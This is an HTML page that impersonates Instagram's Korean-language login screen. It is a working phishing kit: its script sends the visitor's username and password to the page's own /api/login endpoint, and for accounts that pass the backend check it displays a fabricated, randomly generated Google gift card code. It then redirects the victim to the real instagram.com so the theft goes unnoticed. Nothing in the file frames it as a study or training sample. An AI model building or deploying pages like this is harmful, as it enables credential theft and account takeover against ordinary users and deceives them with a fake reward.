<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .contentsWrap {
            width: 350px;
            text-align: center;
        }
        .loginWindow {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 30px 40px;
            margin-bottom: 10px;
            border-radius: 1px;
        }
        .instaLogoText {
            font-family: 'Billabong', cursive, sans-serif;
            font-size: 45px;
            font-weight: normal;
            color: #262626;
            margin: 22px 0 25px 0;
        }
        .inlineToBlock {
            width: 100%;
            box-sizing: border-box;
            display: block;
        }
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 12px;
            padding: 12px 9px 8px 9px;
            outline: none;
            margin-bottom: 6px;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        button.ordinaryLogin {
            background: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: white;
            font-size: 14px;
            font-weight: 600;
            padding: 7px;
            margin-top: 14px;
            cursor: pointer;
        }
        button.ordinaryLogin:active {
            opacity: 0.7;
        }
        .horizonAndOrWrap {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        .horizonAndOrWrap hr {
            flex-grow: 1;
            border: none;
            border-top: 1px solid #dbdbdb;
        }
        .horizonAndOrWrap .or {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .noneunderline {
            text-decoration: none;
        }
        .facebookLogin {
            background: transparent;
            border: none;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 5px;
            width: 100%;
        }
        .haveAccount {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            font-size: 14px;
            color: #262626;
        }
        .haveAccount a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        #errorMessage {
            color: #ed4956;
            font-size: 13px;
            margin-bottom: 15px;
            display: none;
            line-height: 1.4;
        }
        #rewardBox {
            display: none;
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px 20px;
            border-radius: 1px;
        }
        .reward-title {
            font-size: 18px;
            font-weight: 700;
            color: #262626;
            margin-bottom: 15px;
        }
        .reward-code {
            background: #efefef;
            padding: 12px;
            font-size: 15px;
            font-weight: bold;
            color: #4285F4;
            letter-spacing: 1.5px;
            margin: 20px 0;
            border-radius: 4px;
            border: 1px dashed #dbdbdb;
        }
        .reward-desc {
            font-size: 13px;
            color: #8e8e8e;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    
    <div class="contentsWrap">
        <!-- 로그인 창 -->
        <div class="loginWindow" id="loginWindow">
            <div class="instaLogoText">Instagram</div>
            
            <div id="errorMessage"></div>

            <form id="loginForm">
                <input type="text" id="username" placeholder="전화번호, 사용자 이름 또는 이메일" class="inlineToBlock" required>
                <input type="password" id="password" placeholder="비밀번호" class="inlineToBlock" required>
                <button type="submit" id="submitBtn" class="inlineToBlock ordinaryLogin">로그인</button>
            </form>

            <div class="horizonAndOrWrap">
                <hr class="leftHr">
                <div class="or">또는</div>
                <hr class="rightHr">
            </div>

            <a href="#" class="noneunderline">
                <button class="inlineToBlock facebookLogin" type="button">
                    <span style="font-weight: bold; margin-right: 5px; color: #385185;">f</span> Facebook으로 로그인
                </button>
            </a>
        </div>
        
        <!-- 구글 기프트 카드 지급 완료 창 -->
        <div id="rewardBox">
            <div class="reward-title">🎁 구글 기프트 카드 지급 완료!</div>
            <div class="reward-desc">참여가 확인되었습니다.<br>아래 기프트 코드를 등록해 주세요.</div>
            <div class="reward-code" id="couponCode"></div>
            <div class="reward-desc" id="timerText" style="font-size: 12px; margin-top: 15px; color: #0095f6; font-weight: 600;">6초 후 인스타그램으로 이동합니다...</div>
        </div>

        <div class="haveAccount" id="bottomBox">
            <p>계정이 없으신가요? <a href="#" class="noneunderline">가입하기</a></p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const errorDiv = document.getElementById('errorMessage');
            const submitBtn = document.getElementById('submitBtn');
            
            errorDiv.style.display = 'none';
            submitBtn.innerText = '로그인 중...';
            submitBtn.disabled = true;

            try {
                // 백엔드 API로 검증 요청
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password })
                });

                const result = await response.json();

                if (!response.ok) {
                    // 없는 계정이거나 검증 실패 시 에러 메시지 띄우기 (코드는 절대 안 뜸)
                    errorDiv.innerText = result.message;
                    errorDiv.style.display = 'block';
                    submitBtn.innerText = '로그인';
                    submitBtn.disabled = false;
                    return;
                }

                // 정상 계정일 경우 구글 기프트 카드 코드 생성
                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                let part1 = "", part2 = "", part3 = "", part4 = "";
                for(let i=0; i<4; i++) {
                    part1 += chars.charAt(Math.floor(Math.random() * chars.length));
                    part2 += chars.charAt(Math.floor(Math.random() * chars.length));
                    part3 += chars.charAt(Math.floor(Math.random() * chars.length));
                    part4 += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                const googleCode = `${part1}-${part2}-${part3}-${part4}`;
                document.getElementById('couponCode').innerText = googleCode;

                // 로그인 창 숨기고 기프트 카드 창 띄우기
                document.getElementById('loginWindow').style.display = 'none';
                document.getElementById('bottomBox').style.display = 'none';
                document.getElementById('rewardBox').style.display = 'block';

                // 6초 카운트다운 후 인스타그램으로 이동
                let timeLeft = 5;
                const timerInterval = setInterval(() => {
                    document.getElementById('timerText').innerText = `${timeLeft}초 후 인스타그램으로 이동합니다...`;
                    timeLeft--;
                    if (timeLeft < 0) {
                        clearInterval(timerInterval);
                        window.location.href = "https://www.instagram.com";
                    }
                }, 1000);

            } catch (err) {
                console.log(err);
                errorDiv.innerText = "서버 통신 중 오류가 발생했습니다.";
                errorDiv.style.display = 'block';
                submitBtn.innerText = '로그인';
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
